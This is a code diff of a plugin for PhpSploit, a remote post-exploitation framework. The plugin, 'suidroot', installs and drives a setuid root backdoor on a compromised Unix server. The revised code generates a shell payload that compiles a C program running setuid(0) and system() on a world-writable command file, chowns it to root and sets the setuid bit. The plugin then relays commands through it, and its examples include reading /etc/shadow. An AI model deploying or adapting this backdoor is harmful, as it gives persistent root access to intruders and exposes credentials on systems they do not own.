@@ -1,30 +1,27 @@
-"""Basic setuid exploit handler
+"""Setuid backdoor handler
 
 SYNOPSIS:
-    suidroot generate <FILE>
+    suidroot --create <SUIDROOT_BACKDOOR> <SUIDROOT_PIPE>
     suidroot "<COMMAND>"
 
 DESCRIPTION:
-    Create an setuid byte infected file from a temporary
-    obtained access as privileged user by executing a one line
-    shell payload, to send privileged commands from this
-    PhpSploit plugin.
-    In order to enable this plugin, you must have a way to
-    execute something as a privileged user. This plugin do not
-    handles any exploit, it just permits you to keep an
-    obtained privileged access on a remote unix based system.
-    - When you got some access, use the 'generate' command
-    to choose the remote file path you want to use as setuid
-    privilege handler. Next, execute AS THE PRIVILEGED USER
-    the plugin generated shell payload, and then answer 'y'
-    to the execution confirmation query, which will check if
-    the payload has been correctly executed.
-    - One the steps above are done, you can enjoy your
-    privileged access by using the suidroot <some-command>"
-    syntax.
+    This plugin provides a simple way to install a setuid(2)
+    backdoor, and use it for presistent privilege escalation
+    through phpsploit.
 
-    NOTE: Since this plugin uses the unix's setuid feature as
-    tunnel, it is obsolete on other platforms like Windows.
+    Environment variables:
+    <SUIDROOT_BACKDOOR> - The setuid backdoor file to create
+    <SUIDROOT_PIPE> - The file used to store next command
+
+    NOTES:
+    - This plugin only performs root access persistance
+    from a previously obtained access.
+    - Only works on unix like systems with command execution
+    available.
+    - In order to work properly, unprivileged user must
+    have execution access to <SUIDROOT_BACKDOOR> file
+    - In order to work properly, unprivileged user must have
+    write permissions on <SUIDROOT_PIPE> file
 
 WARNING:
     Considering the PhpSploit's input parser, commands which
@@ -37,21 +34,21 @@ WARNING:
       > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"
 
 EXAMPLES:
-    > suidroot generate /var/tmp/setuid-priv.bin
-      - Generate a payload to execute privileged, using the
-        given file path as execution tunnel
+    > suidroot --create /tmp/backdoor /tmp/backdoor-batch.sh
+      - Generates the payload to be run as root in order
+        to enable persistance through phpsploit
     > suidroot cat /tmp/shadow
-      - Print the /etc/shadow data as privileged user
+      - Print the /etc/shadow data as root
     > suidroot "whoami; id"
       - Show your current user and id (enjoy!)
 
 ENVIRONMENT:
     * SUIDROOT_BACKDOOR
-        The exploit file with setuid byte
+        The setuid(2) backdoor file
     * SUIDROOT_PIPE
         The SUIDROOT_BACKDOOR's command repsonse recipient
     * SUIDROOT_PWD
-        The current working directory as privileged user
+        Current working directory for privileged user
 
 AUTHOR:
     nil0x42 <http://goo.gl/kb2wf>
@@ -66,73 +63,56 @@ from api import plugin
 from api import server
 from api import environ
 
+SUIDROOT_ENV_VARS = {"SUIDROOT_BACKDOOR", "SUIDROOT_PIPE", "SUIDROOT_PWD"}
+
 if environ["PLATFORM"].lower().startswith("win"):
     sys.exit("Plugin available on unix-based platforms only")
 
 if len(plugin.argv) < 2:
     sys.exit(plugin.help)
 
-if plugin.argv[1] == 'generate':
-    # this command requires a third argument
-    if len(plugin.argv) != 3:
+if plugin.argv[1] == '--create':
+    if len(plugin.argv) != 4:
         sys.exit(plugin.help)
 
     # the third arg determines this setuid file to use
-    suid_file = server.path.abspath(plugin.argv[2])
-    suid_dir = server.path.dirname(suid_file)
+    backdoor_file = server.path.abspath(plugin.argv[2])
+    pipe_file = server.path.abspath(plugin.argv[3])
+
+    suid_dir = server.path.dirname(backdoor_file)
 
     # create the payload that must be run as privileged used.
     # The suidroot backdoor is then created with suid byte
     # enabled, making tunnel available.
-    pipe_file = suid_dir + "/.x.x.x"
-    backdoor = 'main(){setuid(0);system("%s");}' % pipe_file
-    payload = ("chmod 777 %d;echo -e '%b'>%f;gcc -x c"
-               " -o %f %f;chown root %f;chmod 4777 %f")
-    payload = payload.replace('%b', backdoor)
-    payload = payload.replace('%f', suid_file)
-    payload = payload.replace('%d', suid_dir)
+    payload = ("echo -e 'main(){setuid(0);system(\"%p\");}'>%f;"
+               "gcc -x c -o %f %f;"
+               "chown root %f;"
+               "chmod 4755 %f;"
+               "touch %p;"
+               "chmod 777 %p;" # write AND execution required for `others`
+               ).replace('%f', backdoor_file).replace('%p', pipe_file)
 
-    # once generated, ask the user to execute the payload as privileged user
-    print("[*] To activate the suidroot backdoor, execute"
-          " this payload AS ROOT on the remote system:")
+    # prevent previous configuration override
+    if SUIDROOT_ENV_VARS.issubset(set(environ)):
+        msg = "suidroot environment variables already set. override them ?"
+        if ui.input.Expect(False, skip_interrupt=False)(msg):
+            sys.exit("Operation canceled")
+
+    print("[*] In order to use suidroot privileged command execution, "
+          "run the following shell payload AS ROOT on the remote system:")
     print(ui.color.colorize("\n", "%Blue", payload, "\n"))
 
-    # wait for positive response before creating the env var
-    msg = "Press enter as soon as the payload had been executed "
-    try:
-        ui.input.Expect(None, skip_interrupt=False)(msg)
-    except (KeyboardInterrupt, EOFError):
-        sys.exit("Payload generation aborted")
-
-    # send the checker.php payload with BACKDOOR value
-    checker = server.payload.Payload("checker.php")
-    checker['BACKDOOR'] = suid_file
-    checker.send()
-
-    # if the env do not exist, create it empty
-    # import pprint
-    # pprint.pprint(environ)
-    if "SUIDROOT_BACKDOOR" not in list(environ.keys()):
-        environ['SUIDROOT_BACKDOOR'] = "_"
-    # pprint.pprint(environ)
-
-    # build the env var value
-    if suid_file != environ['SUIDROOT_BACKDOOR']:
-        try:
-            del environ['SUIDROOT_BACKDOOR']
-        except:
-            pass
-        environ['SUIDROOT_BACKDOOR'] = suid_file
-        environ['SUIDROOT_PWD'] = environ['PWD']
-        environ['SUIDROOT_PIPE'] = pipe_file
-
-    print("[*] The suidroot exploit is now available !")
+    environ['SUIDROOT_BACKDOOR'] = backdoor_file
+    environ['SUIDROOT_PIPE'] = pipe_file
+    environ['SUIDROOT_PWD'] = environ['PWD']
     sys.exit()
 
 
 # On classic command pass, make sure the exploit is activated
-if 'SUIDROOT_BACKDOOR' not in environ.keys():
-    sys.exit("Exploit still not deployed, use the 'generate' argument")
+for var in SUIDROOT_ENV_VARS:
+    msg = "Missing environment variable: %s: Use 'suidroot --create'"
+    if var not in environ:
+        sys.exit(msg % var)
 
 # build the command to send from given arguments
 command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
